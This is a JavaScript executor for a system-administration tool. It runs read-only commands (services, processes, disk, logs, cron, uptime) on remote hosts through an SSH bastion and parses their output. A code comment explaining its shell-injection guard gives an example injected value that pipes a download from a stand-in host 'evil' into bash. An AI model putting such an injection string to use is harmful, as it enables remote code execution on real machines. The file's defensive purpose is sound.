/**
 * System Admin Tool Executor
 *
 * Native executor for system_admin tool.
 * Replaces system-admin.json n8n workflow.
 * Operations: services, processes, disk, memory, logs, cron, uptime.
 */

const { isSafeShellArg } = require('../shellSafe.js');

/**
 * system_admin — system administration operations via bastion SSH
 */
async function systemAdmin(callBastion, input) {
  const host = input.host || 'docker01';
  const operation = input.operation || 'uptime';

  // QUOXTRUST FND_01M3SGFV (shell-injection): every model-supplied field that is
  // interpolated into a cmd below (path/unit/priority/since/user) is validated against a
  // strict allowlist FIRST and the whole call is REFUSED on any violation — a value like
  // path="/tmp; curl evil|bash #" never reaches callBastion. The tool's operations are
  // reads, so validated input keeps them fully usable; only injection is removed. (The
  // input_schema does not declare these fields and nothing enforces additionalProperties,
  // so this executor-side guard is the real boundary, not the schema.)
  for (const kind of ['path', 'unit', 'priority', 'since', 'user']) {
    if (!isSafeShellArg(kind, input[kind])) {
      return { success: false, error: `invalid_${kind}`, detail: `system_admin ${kind} contains characters not allowed in a shell argument (injection guard)` };
    }
  }

  let cmd;

  switch (operation) {
    case 'services': {
      const filter = input.filter || 'all';
      if (filter === 'failed') {
        cmd = `systemctl list-units --type=service --state=failed --no-pager --plain`;
      } else if (filter === 'running') {
        cmd = `systemctl list-units --type=service --state=running --no-pager --plain | head -50`;
      } else {
        cmd = `systemctl list-units --type=service --no-pager --plain | head -100`;
      }
      break;
    }
    case 'processes': {
      const sortBy = input.sort_by || 'cpu';
      const limit = Math.min(parseInt(input.limit) || 20, 50);
      cmd = sortBy === 'memory'
        ? `ps aux --sort=-%mem | head -${limit + 1}`
        : `ps aux --sort=-%cpu | head -${limit + 1}`;
      break;
    }
    case 'disk':
      cmd = input.path
        ? `du -sh ${input.path}/* 2>/dev/null | sort -rh | head -20`
        : `df -h --output=source,size,used,avail,pcent,target | grep -v tmpfs | grep -v udev`;
      break;
    case 'memory':
      cmd = `free -h && echo '---' && cat /proc/meminfo | head -20`;
      break;
    case 'logs': {
      const unit = input.unit ? `-u ${input.unit}` : '';
      const priority = input.priority ? `-p ${input.priority}` : '';
      const since = input.since || '1h';
      const lines = Math.min(parseInt(input.lines) || 100, 500);
      cmd = `journalctl ${unit} ${priority} --since "${since} ago" --no-pager -n ${lines}`;
      break;
    }
    case 'cron':
      cmd = input.user
        ? `crontab -u ${input.user} -l 2>/dev/null || echo 'No crontab for user'`
        : require('../cronReadCommand.js').CRON_ALL_CMD;
      break;
    case 'uptime':
    default:
      cmd = `uptime && echo '---' && cat /proc/loadavg`;
      break;
  }

  const result = await callBastion(host, cmd);
  if (!result.success) {
    // Honest failure regardless of whether stdout/output is non-empty — a
    // non-zero exit that still printed partial output is still a failure
    // (error-body-as-data bug, the mikrotik lesson).
    return result;
  }

  const raw = result.output || result.stdout || '';
  return formatSystemResult(operation, raw, host);
}

function formatSystemResult(operation, raw, host) {
  const base = { success: true, operation, host };

  switch (operation) {
    case 'services':
      return { ...base, ...parseServices(raw) };
    case 'processes':
      return { ...base, ...parseProcesses(raw) };
    case 'disk':
      return { ...base, ...parseDisk(raw) };
    case 'memory':
      return { ...base, ...parseMemory(raw) };
    case 'logs':
      return { ...base, ...parseLogs(raw) };
    case 'cron':
      return { ...base, raw };
    case 'uptime':
    default:
      return { ...base, ...parseUptime(raw) };
  }
}

function parseServices(raw) {
  const lines = raw.trim().split('\n').filter(Boolean);
  const services = lines.slice(1).map(line => {
    const parts = line.trim().split(/\s+/);
    return {
      unit: parts[0],
      load: parts[1],
      active: parts[2],
      sub: parts[3],
      description: parts.slice(4).join(' ')
    };
  }).filter(s => s.unit);

  return {
    services,
    count: services.length
  };
}

function parseProcesses(raw) {
  const lines = raw.trim().split('\n').filter(Boolean);
  const processes = lines.slice(1).map(line => {
    const parts = line.trim().split(/\s+/);
    return {
      user: parts[0],
      pid: parts[1],
      cpu: parts[2],
      mem: parts[3],
      command: parts.slice(10).join(' ')
    };
  }).filter(p => p.pid);

  return { processes };
}

function parseDisk(raw) {
  const lines = raw.trim().split('\n').filter(Boolean);
  const filesystems = lines.slice(1).map(line => {
    const parts = line.trim().split(/\s+/);
    return {
      filesystem: parts[0],
      size: parts[1],
      used: parts[2],
      available: parts[3],
      percent: parts[4],
      mount: parts[5]
    };
  }).filter(f => f.filesystem);

  return { filesystems };
}

function parseMemory(raw) {
  const sections = raw.split('---');
  const freeOutput = (sections[0] || '').trim();
  const lines = freeOutput.split('\n').filter(Boolean);

  let memory = null;
  let swap = null;

  for (const line of lines) {
    if (line.startsWith('Mem:')) {
      const parts = line.trim().split(/\s+/);
      memory = {
        total: parts[1],
        used: parts[2],
        free: parts[3],
        shared: parts[4],
        cache: parts[5],
        available: parts[6]
      };
    } else if (line.startsWith('Swap:')) {
      const parts = line.trim().split(/\s+/);
      swap = {
        total: parts[1],
        used: parts[2],
        free: parts[3]
      };
    }
  }

  return { memory, swap };
}

function parseLogs(raw) {
  const logs = raw.trim().split('\n').filter(Boolean);
  return {
    logs,
    line_count: logs.length
  };
}

function parseUptime(raw) {
  const sections = raw.split('---');
  const uptimeLine = (sections[0] || '').trim();

  // Parse "up X days, H:MM" and "load average: 0.5, 0.3, 0.2"
  const uptimeMatch = uptimeLine.match(/up\s+(.+?),\s+\d+\s+user/);
  const loadMatch = uptimeLine.match(/load average:\s*([\d.]+),\s*([\d.]+),\s*([\d.]+)/);

  return {
    uptime: uptimeMatch ? uptimeMatch[1].trim() : uptimeLine,
    load: loadMatch
      ? { '1m': loadMatch[1], '5m': loadMatch[2], '15m': loadMatch[3] }
      : null
  };
}

module.exports = { systemAdmin };
